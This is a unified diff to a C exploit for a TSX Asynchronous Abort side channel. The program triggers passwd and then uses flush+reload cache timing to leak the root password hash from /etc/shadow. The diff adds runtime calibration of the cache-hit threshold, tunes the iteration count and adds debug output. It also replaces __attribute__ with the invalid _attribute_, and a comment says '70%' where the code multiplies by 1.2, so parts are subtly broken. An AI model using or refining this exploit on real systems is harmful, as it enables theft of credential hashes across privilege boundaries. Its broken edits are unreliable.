@@ -20,7 +20,7 @@
 #include "asm.h"
 #include <x86intrin.h>
 
-#define CACHE_THRESHOLD 100
+
 #define EXPONENT 12
 #define STRIDE (1 << EXPONENT)
 #define STEP_SIZE 1
@@ -37,14 +37,72 @@
 #define SHADOW_START "root:$1$"
 
 // TODO: it is a very big number just because we exit early
-uint32_t iterations = 1000000;
-// uint32_t iterations = 30000;
+//uint32_t iterations = 1000000;
+uint32_t iterations = 30000;
 uint32_t reload_signal_thres;
 
 unsigned char *reloadbuffer0;
 void *leakbuffer;
 uint32_t *cache_hits;
 uint32_t *cache_hits0;
+uint64_t CACHE_THRESHOLD = 150;  
+
+uint64_t measure_access(unsigned char* addr, int is_miss) {
+    uint64_t min_time = UINT64_MAX;
+    
+    for(int i = 0; i < 100; i++) {
+        if(is_miss) {
+            clflush(addr);
+        } else {
+            (volatile char)addr; 
+        }
+        mfence();
+        
+        uint64_t start = rdtscp();
+        (volatile char)addr;
+        lfence();
+        uint64_t end = rdtscp();
+        
+        uint64_t delta_t = end - start;
+        if(delta_t < min_time) {
+            min_time = delta_t;
+        }
+    }
+    return min_time;
+}
+
+uint64_t get_cache_threshold(){
+    uint64_t hits = 0;    
+    uint64_t misses = 0;   
+    uint64_t delta_t;
+
+    unsigned char test_line[64];
+    test_line[0] = 1;
+
+    //HITS
+    (volatile char)test_line;
+    mfence();
+
+    for(int i = 0; i < 10000; i++) {
+        delta_t = measure_access(test_line, 0);
+        hits += delta_t;
+    }
+
+    //MISSES
+    clflush(test_line);
+    mfence();
+
+    for(int i = 0; i < 10000; i++) {
+        delta_t = measure_access(test_line, 1);
+        misses += delta_t;
+    }
+
+    uint64_t hit_avg = hits / 10000;
+    uint64_t miss_avg = misses / 10000;
+    uint64_t threshold = (miss_avg + hit_avg) / 2;
+ 
+    return threshold * 1.2;  // 70% of average for reliability
+}
 
 int* get_affinity(uint8_t* count) {
     // expect no more than 64 CPUs.
@@ -140,7 +198,7 @@ void init_data_structures() {
     }
 }
 
-inline __attribute__((always_inline)) void __call_passwd(char *const argv[]) {
+inline _attribute_((always_inline)) void __call_passwd(char *const argv[]) {
     if (fork() == 0) {
         int devnull = open("/dev/null", O_WRONLY);
         dup2(devnull, 1);
@@ -180,7 +238,7 @@ static pid_t set_affinity_call_passwd() {
     return child_pid0;
 }
 
-inline __attribute__((always_inline)) void taa(void *leak_addr, const unsigned int exp) {
+inline _attribute_((always_inline)) void taa(void *leak_addr, const unsigned int exp) {
 	asm volatile(
 	"clflush (%0)\n"
     "sfence\n"
@@ -195,7 +253,7 @@ inline __attribute__((always_inline)) void taa(void *leak_addr, const unsigned i
 	);
 }
 
-inline __attribute__((always_inline)) void taa_k7_l1(void *leak_addr, const unsigned int exp, register uint64_t known_prefix) {
+inline _attribute_((always_inline)) void taa_k7_l1(void *leak_addr, const unsigned int exp, register uint64_t known_prefix) {
 	asm volatile(
 	"clflush (%0)\n"
     "sfence\n"
@@ -213,7 +271,7 @@ inline __attribute__((always_inline)) void taa_k7_l1(void *leak_addr, const unsi
 }
 
 
-inline __attribute__((always_inline)) void leak_secret_bytes(char *leaked_secret, int start, int end, int iterations, 
+inline _attribute_((always_inline)) void leak_secret_bytes(char *leaked_secret, int start, int end, int iterations, 
     const unsigned int reload_signal_threshold, int step_size) {
     
     // TODO: Ensure we detect end of password and break at that point.
@@ -246,6 +304,8 @@ inline __attribute__((always_inline)) void leak_secret_bytes(char *leaked_secret
 
             // micro optimization: early exit
             if (iteration % 3000 == 0) {
+                //    printf("DEBUG: iteration %d, max_hits: %d\n", iteration, max_hits0);
+
                 update_values_ascii(cache_hits0, &max_hits0, &argmax_hits0);
                 if (max_hits0 >= reload_signal_threshold) {
                     break;
@@ -270,6 +330,9 @@ int main(int argc, char *argv[]) {
     }
     reload_signal_thres = 2; //iterations/5;
     init_data_structures();
+
+    CACHE_THRESHOLD = get_cache_threshold();
+    printf("Dynamic cache threshold: %lu\n", CACHE_THRESHOLD);
     pid_t child_pid = set_affinity_call_passwd();
 
     char leaked_secret[64 + 1];
